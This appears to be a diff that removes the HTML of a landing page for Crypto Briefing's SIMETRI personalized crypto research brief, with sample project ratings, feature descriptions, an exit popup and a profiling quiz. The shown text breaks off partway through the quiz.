-            <div class="simetri-card" aria-label="Sample SIMETRI rating card">
-                <div class="sc-header">
-                    <div class="sc-header-left"> <span class="sc-label">SIMETRI Rating · Personalized</span> <span
-                            class="sc-project">Arbitrum (ARB)</span> </div>
-                    <div class="sc-grade-wrap"> <span class="sc-grade">A−</span> <span
-                            class="sc-grade-label">Overall</span> </div>
-                </div>
-                <div class="sc-body">
-                    <div class="sc-score-row"> <span class="sc-score-name">Technology</span>
-                        <div class="sc-score-bar-wrap">
-                            <div class="sc-score-bar" style="width:88%;background:#2563EB;"></div>
-                        </div> <span class="sc-score-val">8.8</span>
-                    </div>
-                    <div class="sc-score-row"> <span class="sc-score-name">Team &amp; Org</span>
-                        <div class="sc-score-bar-wrap">
-                            <div class="sc-score-bar" style="width:82%;background:#2563EB;"></div>
-                        </div> <span class="sc-score-val">8.2</span>
-                    </div>
-                    <div class="sc-score-row"> <span class="sc-score-name">Market Position</span>
-                        <div class="sc-score-bar-wrap">
-                            <div class="sc-score-bar" style="width:78%;background:#C8A951;"></div>
-                        </div> <span class="sc-score-val">7.8</span>
-                    </div>
-                    <div class="sc-score-row"> <span class="sc-score-name">Tokenomics</span>
-                        <div class="sc-score-bar-wrap">
-                            <div class="sc-score-bar" style="width:71%;background:#C8A951;"></div>
-                        </div> <span class="sc-score-val">7.1</span>
-                    </div>
-                    <div class="sc-score-row"> <span class="sc-score-name">Risk-Adj. Profile</span>
-                        <div class="sc-score-bar-wrap">
-                            <div class="sc-score-bar" style="width:84%;background:#16A34A;"></div>
-                        </div> <span class="sc-score-val">8.4</span>
-                    </div> <!-- Mini bar chart SVG --> <svg width="100%" height="56" viewBox="0 0 240 56" fill="none"
-                        xmlns="http://www.w3.org/2000/svg" style="margin-top:14px;">
-                        <line x1="0" y1="48" x2="240" y2="48" stroke="rgba(255,255,255,0.06)" stroke-width="1" />
-                        <rect x="0" y="20" width="26" height="28" rx="2" fill="#2563EB" opacity="0.7" />
-                        <rect x="34" y="10" width="26" height="38" rx="2" fill="#2563EB" opacity="0.8" />
-                        <rect x="68" y="28" width="26" height="20" rx="2" fill="#C8A951" opacity="0.7" />
-                        <rect x="102" y="16" width="26" height="32" rx="2" fill="#2563EB" opacity="0.6" />
-                        <rect x="136" y="24" width="26" height="24" rx="2" fill="#C8A951" opacity="0.5" />
-                        <rect x="170" y="8" width="26" height="40" rx="2" fill="#16A34A" opacity="0.75" />
-                        <rect x="204" y="18" width="26" height="30" rx="2" fill="#2563EB" opacity="0.55" /> <text x="0"
-                            y="56" font-family="JetBrains Mono,monospace" font-size="7"
-                            fill="rgba(255,255,255,0.2)">Tech</text> <text x="34" y="56"
-                            font-family="JetBrains Mono,monospace" font-size="7"
-                            fill="rgba(255,255,255,0.2)">Team</text> <text x="68" y="56"
-                            font-family="JetBrains Mono,monospace" font-size="7" fill="rgba(255,255,255,0.2)">Mkt</text>
-                        <text x="102" y="56" font-family="JetBrains Mono,monospace" font-size="7"
-                            fill="rgba(255,255,255,0.2)">Tok</text> <text x="136" y="56"
-                            font-family="JetBrains Mono,monospace" font-size="7" fill="rgba(255,255,255,0.2)">Dev</text>
-                        <text x="170" y="56" font-family="JetBrains Mono,monospace" font-size="7"
-                            fill="rgba(255,255,255,0.2)">Risk</text> <text x="204" y="56"
-                            font-family="JetBrains Mono,monospace" font-size="7" fill="rgba(255,255,255,0.2)">Liq</text>
-                    </svg>
-                </div>
-                <div class="sc-footer">
-                    <div class="sc-footer-note">Evaluation: 25 criteria<br />Last updated: <span id="sc-date">—</span>
-                    </div>
-                    <div class="sc-personalized-tag">● Personalized for you</div>
-                </div>
-            </div>
-        </div>
-    </section><!-- ▓▓▓ TRUST STRIP ▓▓▓ -->
-    <div class="trust-strip">
-        <div class="trust-inner">
-            <div class="trust-item"> <svg class="trust-icon" width="18" height="18" viewBox="0 0 18 18" fill="none"
-                    aria-hidden="true">
-                    <circle cx="9" cy="9" r="8" stroke="#1E3A8A" stroke-width="1.5" />
-                    <path d="M5.5 9L7.8 11.5L12.5 6.5" stroke="#1E3A8A" stroke-width="1.5" stroke-linecap="round"
-                        stroke-linejoin="round" />
-                </svg>
-                <div>
-                    <div class="trust-val">Ad-Free</div>
-                    <div class="trust-desc">Zero advertiser influence</div>
-                </div>
-            </div>
-            <div class="trust-sep"></div>
-            <div class="trust-item"> <svg class="trust-icon" width="18" height="18" viewBox="0 0 18 18" fill="none"
-                    aria-hidden="true">
-                    <rect x="2" y="3" width="14" height="12" rx="2" stroke="#1E3A8A" stroke-width="1.5" />
-                    <line x1="5" y1="7" x2="13" y2="7" stroke="#1E3A8A" stroke-width="1.2" />
-                    <line x1="5" y1="10" x2="10" y2="10" stroke="#1E3A8A" stroke-width="1.2" />
-                </svg>
-                <div>
-                    <div class="trust-val">500+ Projects</div>
-                    <div class="trust-desc">Rated in the SIMETRI database</div>
-                </div>
-            </div>
-            <div class="trust-sep"></div>
-            <div class="trust-item"> <svg class="trust-icon" width="18" height="18" viewBox="0 0 18 18" fill="none"
-                    aria-hidden="true">
-                    <path d="M9 2L10.9 6.5H16L11.8 9.4L13.5 14L9 11.2L4.5 14L6.2 9.4L2 6.5H7.1L9 2Z" stroke="#1E3A8A"
-                        stroke-width="1.3" stroke-linejoin="round" />
-                </svg>
-                <div>
-                    <div class="trust-val">25 Criteria</div>
-                    <div class="trust-desc">Per quantitative evaluation</div>
-                </div>
-            </div>
-            <div class="trust-sep"></div>
-            <div class="trust-item"> <svg class="trust-icon" width="18" height="18" viewBox="0 0 18 18" fill="none"
-                    aria-hidden="true">
-                    <circle cx="9" cy="9" r="7" stroke="#1E3A8A" stroke-width="1.5" />
-                    <path d="M9 5V9L11.5 11.5" stroke="#1E3A8A" stroke-width="1.4" stroke-linecap="round" />
-                </svg>
-                <div>
-                    <div class="trust-val">Since 2017</div>
-                    <div class="trust-desc">Independent editorial coverage</div>
-                </div>
-            </div>
-            <div class="trust-sep"></div>
-            <div class="trust-item"> <svg class="trust-icon" width="18" height="18" viewBox="0 0 18 18" fill="none"
-                    aria-hidden="true">
-                    <path d="M9 2C5.1 2 2 5.1 2 9s3.1 7 7 7 7-3.1 7-7-3.1-7-7-7z" stroke="#1E3A8A" stroke-width="1.5" />
-                    <path d="M6 9c0-1.7 1.3-3 3-3" stroke="#1E3A8A" stroke-width="1.3" stroke-linecap="round" />
-                </svg>
-                <div>
-                    <div class="trust-val">Tailored Brief</div>
-                    <div class="trust-desc">Matched to your risk profile</div>
-                </div>
-            </div>
-        </div>
-    </div><!-- ▓▓▓ FEATURE ROWS ▓▓▓ -->
-    <section class="sect">
-        <div class="sect-inner">
-            <div class="sect-eyebrow">What's Inside Your Brief</div>
-            <h2 class="sect-title">Five Research Disciplines.<br />One Objective Report.</h2>
-            <p class="sect-sub">Your SIMETRI brief is assembled from Crypto Briefing's independent research methodology
-                — no sponsored content, no advertiser access to conclusions, no exceptions.</p>
-            <div class="feat-list">
-                <div class="feat-row">
-                    <div class="feat-index">SIMETRI-01</div>
-                    <div class="feat-content">
-                        <h3>Quantitative Project Rating</h3>
-                        <p>Every project in your brief carries a full SIMETRI score across 25 sub-criteria: technology
-                            maturity, team track record, tokenomics structure, market position, liquidity depth, and
-                            on-chain developer activity. Each rating includes a plain-language summary of the key
-                            drivers behind the grade.</p> <span class="feat-tag feat-tag-blue">25-point
-                            evaluation</span>
-                    </div>
-                    <div class="feat-viz"> <!-- Grade badge SVG --> <svg width="120" height="88" viewBox="0 0 120 88"
-                            fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <rect x="20" y="8" width="80" height="72" rx="10" fill="var(--blue-wash)"
-                                stroke="var(--border)" stroke-width="1.2" /> <text x="60" y="42"
-                                font-family="Lora,Georgia,serif" font-size="34" font-weight="700" fill="#1E3A8A"
-                                text-anchor="middle">A−</text> <text x="60" y="60"
-                                font-family="JetBrains Mono,monospace" font-size="9" fill="var(--text-faint)"
-                                text-anchor="middle">SIMETRI GRADE</text>
-                            <rect x="30" y="64" width="60" height="8" rx="2" fill="var(--border)" />
-                            <rect x="30" y="64" width="48" height="8" rx="2" fill="#1E3A8A" opacity="0.6" />
-                        </svg> </div>
-                </div>
-                <div class="feat-row">
-                    <div class="feat-index">SIMETRI-02</div>
-                    <div class="feat-content">
-                        <h3>Personalized Risk Exposure Flags</h3>
-                        <p>Risk flags are filtered to your stated drawdown tolerance and time horizon. A flag that
-                            matters for a short-term tactical trader is suppressed for an 18-month holder — and vice
-                            versa. You receive only the risk signals that are structurally relevant to your stated
-                            mandate, presented without alarmism.</p> <span
-                            class="feat-tag feat-tag-gold">Risk-calibrated</span>
-                    </div>
-                    <div class="feat-viz"> <!-- Risk gauge SVG --> <svg width="120" height="88" viewBox="0 0 120 88"
-                            fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <defs>
-                                <linearGradient id="rg" x1="0" y1="0" x2="1" y2="0">
-                                    <stop offset="0%" stop-color="#16A34A" />
-                                    <stop offset="55%" stop-color="#C8A951" />
-                                    <stop offset="100%" stop-color="#DC2626" />
-                                </linearGradient>
-                            </defs>
-                            <path d="M14 72 A46 46 0 0 1 106 72" stroke="url(#rg)" stroke-width="9" fill="none"
-                                stroke-linecap="round" />
-                            <path d="M14 72 A46 46 0 0 1 82 34" stroke="var(--border)" stroke-width="9" fill="none"
-                                stroke-linecap="round" opacity="0.5" />
-                            <line x1="60" y1="72" x2="85" y2="40" stroke="#1E3A8A" stroke-width="2.5"
-                                stroke-linecap="round" />
-                            <circle cx="60" cy="72" r="4.5" fill="#1E3A8A" /> <text x="14" y="84"
-                                font-family="JetBrains Mono,monospace" font-size="8" fill="#16A34A">LOW</text> <text
-                                x="96" y="84" font-family="JetBrains Mono,monospace" font-size="8" fill="#DC2626"
-                                text-anchor="end">HIGH</text>
-                        </svg> </div>
-                </div>
-                <div class="feat-row">
-                    <div class="feat-index">SIMETRI-03</div>
-                    <div class="feat-content">
-                        <h3>On-Chain Developer Activity Analysis</h3>
-                        <p>Repository commit cadence, core contributor growth, protocol upgrade velocity, and testnet
-                            progression are quantified for every project in your focus sectors. Crypto Briefing's
-                            research team annotates signal spikes and sustained decline patterns that standard price
-                            charts don't reveal.</p> <span class="feat-tag feat-tag-green">On-chain verified</span>
-                    </div>
-                    <div class="feat-viz"> <!-- Dev activity SVG sparkline --> <svg width="140" height="88"
-                            viewBox="0 0 140 88" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <rect x="4" y="4" width="132" height="80" rx="6" fill="var(--bg-soft)"
-                                stroke="var(--border)" />
-                            <polyline points="14,64 30,56 46,52 62,44 78,46 94,32 110,28 126,18" stroke="#1E3A8A"
-                                stroke-width="2" fill="none" stroke-linejoin="round" />
-                            <circle cx="126" cy="18" r="3.5" fill="#16A34A" /> <text x="10" y="78"
-                                font-family="JetBrains Mono,monospace" font-size="8" fill="var(--text-faint)">Commits /
-                                90d</text>
-                            <line x1="14" y1="72" x2="130" y2="72" stroke="var(--border)" stroke-width="1" />
-                        </svg> </div>
-                </div>
-                <div class="feat-row">
-                    <div class="feat-index">SIMETRI-04</div>
-                    <div class="feat-content">
-                        <h3>Tokenomics &amp; Vesting Schedule Audit</h3>
-                        <p>Token unlock calendars, team allocation percentages, inflation schedules, and treasury runway
-                            are presented in a clear timeline format for each project. Upcoming cliff events within your
-                            stated time horizon are flagged explicitly, with historical price response data from prior
-                            unlock events.</p> <span class="feat-tag feat-tag-blue">Vesting timeline included</span>
-                    </div>
-                    <div class="feat-viz"> <!-- Stacked distribution SVG --> <svg width="120" height="88"
-                            viewBox="0 0 120 88" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <!-- Pie / arc segments simplified as stacked bars -->
-                            <rect x="20" y="10" width="80" height="14" rx="3" fill="#1E3A8A" opacity="0.9" /> <text
-                                x="110" y="21" font-family="JetBrains Mono,monospace" font-size="8"
-                                fill="var(--text-muted)" text-anchor="end">Team 18%</text>
-                            <rect x="20" y="28" width="64" height="14" rx="3" fill="#2563EB" opacity="0.7" /> <text
-                                x="110" y="39" font-family="JetBrains Mono,monospace" font-size="8"
-                                fill="var(--text-muted)" text-anchor="end">Public 44%</text>
-                            <rect x="20" y="46" width="40" height="14" rx="3" fill="#C8A951" opacity="0.8" /> <text
-                                x="110" y="57" font-family="JetBrains Mono,monospace" font-size="8"
-                                fill="var(--text-muted)" text-anchor="end">Eco 28%</text>
-                            <rect x="20" y="64" width="14" height="14" rx="3" fill="#DC2626" opacity="0.6" /> <text
-                                x="110" y="75" font-family="JetBrains Mono,monospace" font-size="8"
-                                fill="var(--text-muted)" text-anchor="end">Reserve 10%</text>
-                        </svg> </div>
-                </div>
-                <div class="feat-row">
-                    <div class="feat-index">SIMETRI-05</div>
-                    <div class="feat-content">
-                        <h3>Editorial Thesis &amp; Catalyst Roadmap</h3>
-                        <p>Beyond the numbers, your brief includes Crypto Briefing's editorial thesis for each rated
-                            project: what the investment case depends on, which milestones could invalidate it, and what
-                            near-term catalysts the research team is monitoring. Written for readers who can evaluate
-                            evidence without being told what to conclude.</p> <span
-                            class="feat-tag feat-tag-gold">Editorial assessment</span>
-                    </div>
-                    <div class="feat-viz"> <!-- Roadmap timeline SVG --> <svg width="130" height="88"
-                            viewBox="0 0 130 88" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <line x1="20" y1="16" x2="20" y2="78" stroke="var(--border)" stroke-width="1.5"
-                                stroke-dasharray="3 3" />
-                            <circle cx="20" cy="20" r="5" fill="#16A34A" /> <text x="32" y="24"
-                                font-family="Inter,sans-serif" font-size="9" fill="var(--text-mid)">Mainnet
-                                upgrade</text>
-                            <circle cx="20" cy="42" r="5" fill="#1E3A8A" /> <text x="32" y="46"
-                                font-family="Inter,sans-serif" font-size="9" fill="var(--text-mid)">Team token
-                                cliff</text>
-                            <circle cx="20" cy="62" r="5" fill="var(--border)" stroke="#C8A951" stroke-width="1.5" />
-                            <text x="32" y="66" font-family="Inter,sans-serif" font-size="9" fill="var(--text-faint)">V3
-                                governance vote</text>
-                            <circle cx="20" cy="78" r="4" fill="var(--bg-soft)" stroke="var(--border)"
-                                stroke-width="1.5" /> <text x="32" y="82" font-family="Inter,sans-serif" font-size="9"
-                                fill="var(--text-faint)">Ecosystem grants</text>
-                        </svg> </div>
-                </div>
-            </div>
-        </div>
-    </section><!-- ▓▓▓ SAMPLE OUTPUT ▓▓▓ -->
-    <section class="sect sect-alt">
-        <div class="sect-inner">
-            <div class="sect-eyebrow">Sample Output</div>
-            <h2 class="sect-title">A Report That Looks Like<br />Research — Because It Is.</h2>
-            <p class="sect-sub">A representative brief compiled from SIMETRI's live evaluation database. Every field you
-                see adapts to your profile inputs — sector focus, experience level, and risk tolerance.</p>
-            <div class="sample-grid">
-                <div class="report-card">
-                    <div class="rc-top">
-                        <div class="rc-top-eyebrow">SIMETRI Brief · Personalized Output</div>
-                        <div class="rc-top-title">Your Digital Asset Research Brief</div>
-                        <div class="rc-top-meta"> <span class="rc-badge rc-badge-gold">● Compiled</span> <span
-                                class="rc-badge rc-badge-blue">Long-Term / Moderate</span> </div>
-                    </div>
-                    <div class="rc-body">
-                        <div class="rc-row"><span class="rc-k">Subscriber Tier</span><span
-                                class="rc-v rc-v-blue">SIMETRI Verified</span></div>
-                        <div class="rc-row"><span class="rc-k">Experience Level</span><span
-                                class="rc-v rc-v-white">Active Researcher</span></div>
-                        <div class="rc-row"><span class="rc-k">Investment Goal</span><span
-                                class="rc-v rc-v-gold">Long-Term Appreciation</span></div>
-                        <div class="rc-row"><span class="rc-k">Time Horizon</span><span class="rc-v rc-v-white">12–36
-                                Months</span></div>
-                        <div class="rc-row"><span class="rc-k">Risk Band</span><span
-                                class="rc-v rc-v-gold">Moderate-High</span></div>
-                        <div class="rc-row"><span class="rc-k">Sectors Tracked</span><span class="rc-v rc-v-blue">L1 ·
-                                DeFi · RWA</span></div>
-                        <div class="rc-row"><span class="rc-k">Projects Rated</span><span class="rc-v rc-v-white">14 in
-                                your scope</span></div>
-                        <div class="rc-row"><span class="rc-k">Generated</span><span class="rc-v rc-v-green"
-                                id="rc-date">—</span></div>
-                        <div class="rc-row"><span class="rc-k">Ad-Free</span><span class="rc-v rc-v-green">✓
-                                Verified</span></div>
-                    </div>
-                </div>
-                <div class="analysis-panels">
-                    <div class="ap">
-                        <div class="ap-head"> <span class="ap-dot" style="background:#16A34A"></span> <span
-                                class="ap-title">Top-Rated in Your Scope — SIMETRI Picks</span> </div>
-                        <div class="ap-body">
-                            <div class="ap-finding"> <span class="ap-finding-icon">🔵</span>
-                                <div>
-                                    <div class="ap-finding-text">Arbitrum (ARB) scores A− overall. Technology dimension
-                                        leads the evaluation, underpinned by fraud proof maturity and sequencer
-                                        decentralization progress. Primary risk: concentrated token unlocks in Q3.</div>
-                                    <div class="ap-finding-mono">SIMETRI-ARB-2024 · Grade: A− · Risk Band: Moderate
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="ap-finding"> <span class="ap-finding-icon">🟡</span>
-                                <div>
-                                    <div class="ap-finding-text">Aave (AAVE) maintains a B+ amid declining TVL across
-                                        Ethereum mainnet but strong revenue-to-valuation metrics relative to sector
-                                        peers. Team responsiveness to security incidents rated highly.</div>
-                                    <div class="ap-finding-mono">SIMETRI-AAVE-2024 · Grade: B+ · Risk Band: Moderate
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="ap-finding"> <span class="ap-finding-icon">🟢</span>
-                                <div>
-                                    <div class="ap-finding-text">Ondo Finance (ONDO) earns B for RWA infrastructure
-                                        leadership. On-chain T-bill yield products showing meaningful institutional
-                                        adoption. Regulatory path remains the key binary risk to thesis.</div>
-                                    <div class="ap-finding-mono">SIMETRI-ONDO-2024 · Grade: B · Risk Band: Moderate-High
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="ap">
-                        <div class="ap-head"> <span class="ap-dot" style="background:#DC2626"></span> <span
-                                class="ap-title">Risk Flags — Calibrated to Your Horizon</span> </div>
-                        <div class="ap-body">
-                            <div class="ap-finding"> <span class="ap-finding-icon">⚠️</span>
-                                <div>
-                                    <div class="ap-finding-text">Three L1 projects in your scope have cliff vesting
-                                        events within the next 180 days totaling over 8% of circulating supply.
-                                        Historical price response to comparable events: −14% median 30-day drawdown.
-                                    </div>
-                                    <div class="ap-finding-mono">RISK-VEST-001 · Scope: Solana, Sui, Aptos</div>
-                                </div>
-                            </div>
-                            <div class="ap-finding"> <span class="ap-finding-icon">🔍</span>
-                                <div>
-                                    <div class="ap-finding-text">DeFi sector correlation to ETH beta elevated vs.
-                                        12-month average. Diversification benefit of DeFi exposure is structurally
-                                        reduced during current macro regime. Flagged for 12–36-month horizon holders.
-                                    </div>
-                                    <div class="ap-finding-mono">RISK-CORR-014 · Horizon: 12–36 months</div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section><!-- ▓▓▓ FINAL CTA ▓▓▓ -->
-    <section class="final-cta-sect">
-        <div class="final-cta-inner">
-            <div class="fc-eyebrow">SIMETRI Research Brief</div>
-            <h2>Your Report Takes<br />90 Seconds to Build.</h2>
-            <p>Answer five research-framing questions. Crypto Briefing's SIMETRI engine filters 500+ project ratings
-                down to what's structurally relevant to you — delivered without editorial compromise.</p> <button
-                class="btn-gold" onclick="openQuiz()">Start the Profile Sequence →</button>
-            <div class="final-cta-note">Ad-free. No affiliate arrangements. Unsubscribe at any time.</div>
-        </div>
-    </section><!-- ▓▓▓ FOOTER ▓▓▓ -->
-    <footer>
-        <div class="footer-inner">
-            <div>
-                <div class="footer-brand"> <svg width="20" height="20" viewBox="0 0 26 26" fill="none"
-                        aria-hidden="true">
-                        <rect width="26" height="26" rx="5" fill="#1E3A8A" />
-                        <rect x="5" y="5" width="7" height="7" rx="1.5" fill="white" />
-                        <rect x="14" y="5" width="7" height="4" rx="1" fill="white" opacity="0.6" />
-                        <rect x="14" y="11" width="7" height="4" rx="1" fill="white" opacity="0.4" />
-                        <rect x="5" y="14" width="16" height="2.5" rx="1" fill="white" opacity="0.25" />
-                    </svg> <span class="footer-brand-name">Crypto Briefing</span> </div>
-                <p class="footer-legal">Crypto Briefing is an independent digital media publication providing news
-                    coverage, project evaluations, and quantitative ratings for the cryptocurrency and blockchain
-                    sector. SIMETRI ratings are research opinions and do not constitute investment advice, financial
-                    advice, trading advice, or any other type of advice. Crypto Briefing does not recommend that any
-                    asset should be bought, sold, or held. Always conduct your own due diligence.</p>
-            </div>
-            <div class="footer-links"> <a href="#">Privacy Policy</a> <a href="#">Terms of Service</a> <a
-                    href="#">SIMETRI Methodology</a> <a href="#">Editorial Policy</a> <a href="#">Advertise</a> <a
-                    href="#">Contact</a> </div>
-        </div>
-        <div style="max-width:1160px;margin:0 auto;padding:0 28px;">
-            <div class="footer-bottom"> <span>© <span id="footer-year"></span> Crypto Briefing. All rights
-                    reserved.</span> <span>Independent since 2017 · No advertiser access to editorial conclusions</span>
-            </div>
-        </div>
-    </footer><!-- ══════════════════════════════════     EXIT POPUP══════════════════════════════════ -->
-    <div class="overlay" id="exit-overlay" role="dialog" aria-modal="true" aria-label="Free SIMETRI brief invitation">
-        <div class="exit-card">
-            <div class="exit-stripe"></div>
-            <div class="exit-body">
-                <div class="exit-icon"> <svg width="38" height="38" viewBox="0 0 38 38" fill="none" aria-hidden="true">
-                        <rect width="38" height="38" rx="8" fill="#EFF4FF" />
-                        <rect x="8" y="9" width="22" height="20" rx="3" stroke="#1E3A8A" stroke-width="1.6" />
-                        <line x1="12" y1="15" x2="26" y2="15" stroke="#1E3A8A" stroke-width="1.3" />
-                        <line x1="12" y1="19" x2="21" y2="19" stroke="#1E3A8A" stroke-width="1.3" />
-                        <line x1="12" y1="23" x2="17" y2="23" stroke="#C8A951" stroke-width="1.3" />
-                    </svg> </div>
-                <h2>Your Personalized<br />SIMETRI Brief Is Free.</h2>
-                <p>Before you go — it takes 90 seconds to profile your research mandate. Crypto Briefing's evaluation
-                    engine surfaces only the independent ratings and risk signals that actually apply to your stated
-                    scope. No ads, no affiliate rankings.</p> <button class="exit-cta"
-                    onclick="closeExitPopup(); openQuiz();">Build My SIMETRI Brief →</button> <button
-                    class="exit-dismiss" onclick="closeExitPopup()">No thanks, I'll research without a ratings
-                    filter.</button>
-            </div>
-        </div>
-    </div><!-- ══════════════════════════════════     QUIZ MODAL══════════════════════════════════ -->
-    <div class="overlay" id="quiz-overlay" role="dialog" aria-modal="true"
-        aria-label="SIMETRI brief profiling questionnaire">
-        <div class="quiz-card">
-            <div class="qc-header">
-                <div class="qc-hd-left"> <svg width="18" height="18" viewBox="0 0 26 26" fill="none" aria-hidden="true">
-                        <rect width="26" height="26" rx="5" fill="#1E3A8A" />
-                        <rect x="5" y="5" width="7" height="7" rx="1.5" fill="white" />
-                        <rect x="14" y="5" width="7" height="4" rx="1" fill="white" opacity="0.6" />
-                        <rect x="14" y="11" width="7" height="4" rx="1" fill="white" opacity="0.4" />
-                    </svg> <span class="qc-title">SIMETRI Research Brief</span> </div>
-                <div style="display:flex;align-items:center;gap:12px;"> <span class="qc-counter"
-                        id="step-counter">Section 1 of 5</span> <button class="qc-close" onclick="closeQuiz()"
-                        aria-label="Close">✕</button> </div>
-            </div>
-            <div class="qc-progress">
-                <div class="qc-bar" id="qc-bar" style="width:20%"></div>
-            </div>
-            <div class="qc-body"> <!-- Step 1 -->
-                <div class="quiz-step active" id="step-1">
-                    <div class="qs-section">Section 01 / 05 — Background</div>
-                    <div class="qs-q">How would you describe your experience researching and evaluating cryptocurrency
-                        projects?</div>
-                    <div class="qs-sub">This calibrates the technical depth of your SIMETRI brief — from foundational
-                        project summaries to full quantitative scoring breakdowns.</div>
-                    <div class="opt-list" id="opts-1">
-                        <div class="opt" onclick="pick(1,this,'Newcomer / Learning')" tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Newcomer / Learning<span>I'm building foundational knowledge of the
-                                    asset class and how to evaluate projects objectively.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(1,this,'Self-Directed Researcher')" tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Self-Directed Researcher<span>I read whitepapers, track on-chain
-                                    metrics, and make independent allocation decisions with multi-cycle
-                                    experience.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(1,this,'Professional Analyst / Finance Background')"
-                            tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Professional Analyst / Finance Background<span>My background is in
-                                    TradFi or technology research. I approach crypto with structured analytical
-                                    frameworks.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(1,this,'Fund Manager / Institutional Allocator')" tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Fund Manager / Institutional Allocator<span>I manage capital for a
-                                    vehicle or institution and require evaluation output compatible with fiduciary
-                                    standards.</span></div>
-                        </div>
-                    </div>
-                </div> <!-- Step 2 -->
-                <div class="quiz-step" id="step-2">
-                    <div class="qs-section">Section 02 / 05 — Investment Goal</div>
-                    <div class="qs-q">What is the primary investment objective you're evaluating projects against?</div>
-                    <div class="qs-sub">Your goal determines which SIMETRI sub-scores receive the highest weighting in
-                        your brief — and which risk categories get flagged as structurally relevant.</div>
-                    <div class="opt-list" id="opts-2">
-                        <div class="opt" onclick="pick(2,this,'Long-Term Capital Appreciation')" tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Long-Term Capital Appreciation<span>Holding assets over multiple
-                                    cycles for maximum compound return, accepting near-term volatility.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(2,this,'Yield and Passive Income')" tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Yield and Passive Income<span>Staking, liquidity provision, or
-                                    protocol participation to generate regular on-chain returns.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(2,this,'Diversification from Traditional Assets')" tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Diversification from Traditional Assets<span>Adding uncorrelated
-                                    exposure to a multi-asset portfolio with explicit volatility budgets.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(2,this,'Active Trading and Short-Term Positioning')"
-                            tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Active Trading and Short-Term Positioning<span>Tactical entries around
-                                    catalysts, technical structure, or narrative rotation across shorter windows.</span>
-                            </div>
-                        </div>
-                    </div>
-                </div> <!-- Step 3 -->
-                <div class="quiz-step" id="step-3">
-                    <div class="qs-section">Section 03 / 05 — Time Horizon</div>
-                    <div class="qs-q">What is your realistic holding horizon for the majority of your crypto positions?
-                    </div>
-                    <div class="qs-sub">Your time horizon determines which vesting cliff events, protocol milestone
-                        risks, and macro cycle signals are flagged as material to your brief.</div>
-                    <div class="opt-list" id="opts-3">
-                        <div class="opt" onclick="pick(3,this,'Under 3 months')" tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Under 3 months<span>Event-driven or momentum-based positioning with a
-                                    short defined exit window.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(3,this,'3 to 12 months')" tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">3 to 12 months<span>Swing-to-medium allocation, often aligned with a
-                                    defined protocol catalyst or market structure inflection.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(3,this,'12 to 36 months')" tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">12 to 36 months<span>Conviction-based positions across a full cycle,
-                                    evaluated against adoption and development trajectory.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(3,this,'Indefinite / No defined exit')" tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Indefinite / No defined exit<span>Long-duration holdings anchored in
-                                    structural conviction. Exit is thesis-driven, not time-driven.</span></div>
-                        </div>
-                    </div>
-                </div> <!-- Step 4 -->
-                <div class="quiz-step" id="step-4">
-                    <div class="qs-section">Section 04 / 05 — Risk Tolerance</div>
-                    <div class="qs-q">How do you handle drawdowns in your crypto positions?</div>
-                    <div class="qs-sub">Crypto Briefing's risk flags are calibrated to your stated drawdown parameters —
-                        so you see the alerts that are actually actionable for your mandate, not generic disclaimers.
-                    </div>
-                    <div class="opt-list" id="opts-4">
-                        <div class="opt" onclick="pick(4,this,'Conservative — I reduce exposure at ~10% drawdown')"
-                            tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Conservative<span>I systematically reduce or exit positions when
-                                    drawdowns reach approximately 10%. Capital preservation takes priority.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(4,this,'Moderate — I hold through 10–25% drawdowns')"
-                            tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Moderate<span>I hold through 10–25% pullbacks if my research thesis
-                                    remains intact, but reassess at deeper levels.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(4,this,'Moderate-High — I hold through 25–50% drawdowns')"
-                            tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Moderate-High<span>I'm prepared for 25–50% temporary drawdowns on
-                                    high-conviction positions. I average down selectively.</span></div>
-                        </div>
-                        <div class="opt" onclick="pick(4,this,'Aggressive — I hold regardless of drawdown magnitude')"
-                            tabindex="0">
-                            <div class="opt-radio"></div>
-                            <div class="opt-text">Aggressive<span>I hold through drawdowns of any magnitude if the
-                                    fundamental thesis remains structurally valid.</span></div>
-                        </div>
-                    </div>
-                </div> <!-- Step 5 -->
-                <div class="quiz-step" id="step-5">
-                    <div class="qs-section">Section 05 / 05 — Research Scope</div>
-                    <div class="qs-q">Which project categories are most relevant to your research scope?</div>
-                    <div class="qs-sub">Select all that apply. Your brief will surface SIMETRI ratings only for projects
-                        within your stated categories — no irrelevant noise.</div>
-                    <div class="tag-grid" id="opts-5">
